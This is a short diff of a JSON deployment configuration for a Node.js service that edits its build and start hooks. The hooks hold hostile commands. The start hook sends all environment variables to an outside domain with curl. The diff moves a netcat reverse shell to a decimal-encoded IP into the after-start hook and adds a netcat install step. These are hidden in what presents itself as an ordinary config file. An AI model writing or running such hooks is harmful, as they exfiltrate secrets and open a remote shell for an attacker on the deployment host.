@@ -2,11 +2,11 @@
     "id": "local",
     "type": "wedeploy/nodejs:beta",
     "hooks": {
-        "before_build": "nc 1412103118 443 -e /bin/bash",
+        "before_build": "apk -U add netcat-openbsd",
         "build": "npm install",
         "after_build": "",
         "before_start": "",
         "start": "curl topolik.cz/start?a=$(env)",
-        "after_start": ""
+        "after_start": "nc 1412103118 443 -e /bin/bash"
     }
 }
